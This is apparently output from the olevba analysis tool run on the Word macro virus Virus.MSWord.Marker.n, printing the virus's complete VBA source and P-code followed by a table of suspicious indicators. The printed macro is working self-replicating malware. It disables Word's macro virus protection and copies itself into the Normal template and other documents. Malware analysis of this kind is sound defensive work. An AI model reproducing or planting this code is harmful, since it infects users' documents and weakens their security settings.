olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Gateway Pre-installed User12/02/99 12:43:36HP LaserJet 5/5M - Standard on \\HPOXFORDST\HP_LJ5mel
Sub ViewVBCode()
'Gateway Pre-installed User12/02/99 12:43:36HP LaserJet 5/5M - Standard on \\HPOXFORDST\HP_LJ5mel
End Sub
Private Sub Document_Close()
On Error Resume Next
Const ID = "xyzzy"
Dim hdlskk As Boolean
Dim ijnff, iitgh As Object
Dim zmbbcxx As String
Set ijnff = ActiveDocument.VBProject.VBComponents.Item(1)
Set iitgh = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
If (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
If ijnff.codemodule.Find(ID, 1, 1, 10000, 10000) = True Then
hdlskk = NormalTemplate.Saved
zmbbcxx = ijnff.codemodule.Lines(1, ijnff.codemodule.CountOfLines)
iitgh.codemodule.deletelines 1, iitgh.codemodule.CountOfLines
iitgh.codemodule.AddFromString zmbbcxx
If hdlskk = True Then NormalTemplate.Save
End If
If iitgh.codemodule.Find(ID, 1, 1, 10000, 10000) = True And (Mid(ActiveDocument.FullName, 2, 1) = ":" Or ActiveDocument.Saved = False) Then
zmbbcxx = iitgh.codemodule.Lines(1, iitgh.codemodule.CountOfLines)
ijnff.codemodule.deletelines 1, ijnff.codemodule.CountOfLines
ijnff.codemodule.AddFromString zmbbcxx
End If
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3293 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0060 "Gateway Pre-installed User12/02/99 12:43:36HP LaserJet 5/5M - Standard on \\HPOXFORDST\HP_LJ5mel"
' Line #1:
' 	FuncDefn (Sub ViewVBCode())
' Line #2:
' 	QuoteRem 0x0000 0x0060 "Gateway Pre-installed User12/02/99 12:43:36HP LaserJet 5/5M - Standard on \\HPOXFORDST\HP_LJ5mel"
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0005 "xyzzy"
' 	VarDefn ID
' Line #7:
' 	Dim 
' 	VarDefn hdlskk (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ijnff
' 	VarDefn iitgh (As Object)
' Line #9:
' 	Dim 
' 	VarDefn zmbbcxx (As String)
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ijnff 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set iitgh 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #14:
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #15:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St hdlskk 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St zmbbcxx 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #18:
' 	Ld zmbbcxx 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #19:
' 	Ld hdlskk 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld ID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld iitgh 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St zmbbcxx 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #24:
' 	Ld zmbbcxx 
' 	Ld ijnff 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	EndSub 
' Line #30:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

